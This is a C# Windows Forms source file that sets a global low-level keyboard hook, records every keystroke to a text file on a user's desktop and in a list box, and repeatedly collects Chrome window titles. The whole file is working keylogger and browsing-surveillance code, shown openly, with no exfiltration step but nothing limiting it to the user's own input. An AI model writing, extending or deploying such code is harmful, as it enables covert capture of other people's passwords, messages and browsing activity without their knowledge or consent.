
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WinFormsApp2
{
    public partial class Form1 : Form
    {
        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KWYDOWN = 0x0100;
        private static IntPtr Hook = IntPtr.Zero;
        private static LowLevelKeyboardProc llkProcedure = HookCallback;
        private List<string> tabTitles = new List<string>();
        public Form1()
        {
            InitializeComponent();
            Hook = SetHook(llkProcedure);
            RefreshListBoxAsync("chrome");
        }
        static string s = string.Empty;
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KWYDOWN)
            {
                Form1 formInstance = Application.OpenForms.OfType<Form1>().FirstOrDefault(); // Get the instance of Form1
                if (formInstance != null)
                {
                    ListBox listBox2 = formInstance.listBox2; // Get listBox2 from the form instance
                    int vKCode = Marshal.ReadInt32(lParam);
                    if (((Keys)vKCode).ToString() == ((Keys)vKCode).ToString().ToUpper())
                    {
                        Console.Write(((Keys)vKCode).ToString().ToLower());
                        using (StreamWriter outwrite = new StreamWriter("C:\\Users\\AF CENTER\\Desktop\\New Text.txt", true))
                        {
                            outwrite.Write((Keys)vKCode);
                            Console.WriteLine((Keys)vKCode);
                            listBox2.Invoke((MethodInvoker)(() => listBox2.Items.Add((Keys)vKCode))); // Add key to listBox2
                        }
                    }
                    else if (((Keys)vKCode).ToString() == "Space")
                    {
                        listBox2.Invoke((MethodInvoker)(() => listBox2.Items.Add("New item add"))); // Add item to listBox2
                        Console.Out.Write(" ");
                        using (StreamWriter outwrite = new StreamWriter("C:\\Users\\AF CENTER\\Desktop\\New Text.txt", true))
                        {
                            outwrite.Write(" ");
                        }
                    }
                    else if (((Keys)vKCode).ToString() == "Enter")
                    {
                        Console.WriteLine();
                        using (StreamWriter outwrite = new StreamWriter("C:\\Users\\AF CENTER\\Desktop\\New Text.txt", true))
                        {
                            outwrite.WriteLine();
                        }
                    }
                    else if (((Keys)vKCode).ToString() == "Back")
                    {
                        Console.Out.Write("");
                        using (StreamWriter outwrite = new StreamWriter("C:\\Users\\AF CENTER\\Desktop\\New Text.txt", true))
                        {
                            outwrite.Write("");
                        }
                    }
                }
            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
        }

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr xx, int ncode, IntPtr wparam, IntPtr lparam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idhook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern UIntPtr UnhookWindowsHookEx(IntPtr pttr);

        [DllImport("Kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String moduleName);

        private async Task RefreshListBoxAsync(string processName)
        {
           
            while (true)
            {
                // Get all processes with the specified name
                Process[] chromeProcesses = Process.GetProcessesByName(processName);
                listBox2.Items.Add(s);
                // Clear the existing titles

                foreach (Process process in chromeProcesses)
                {
                    // Get the main window handle of the process
                    IntPtr hwnd = process.MainWindowHandle;

                    // Get the title of the window asynchronously
                    string title = await GetWindowTitleAsync(hwnd);

                    // Add the title to the list
                    // tabTitles.Add(title);
                    if (!listBox1.Items.Contains(title))
                    {
                        // Add the title to the ListBox
                        listBox1.Items.Add(title);
                    }
                }

                // Bind the list to the ListBox's DataSource property
                //listBox1.DataSource = null; // Clear the existing DataSource
               // listBox1.DataSource = tabTitles; // Set the new DataSource

                // Delay for 5 seconds before the next refresh
                await Task.Delay(5000);
            }
        }

        private static Task<string> GetWindowTitleAsync(IntPtr hWnd)
        {
            return Task.Run(() =>
            {
                StringBuilder title = new StringBuilder(256);
                GetWindowText(hWnd, title, title.Capacity);
                return title.ToString();
            });
        }

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            UnhookWindowsHookEx(Hook);
        }  
private void Form1_Load_1(object sender, EventArgs e)
        {

        }   
    }
}
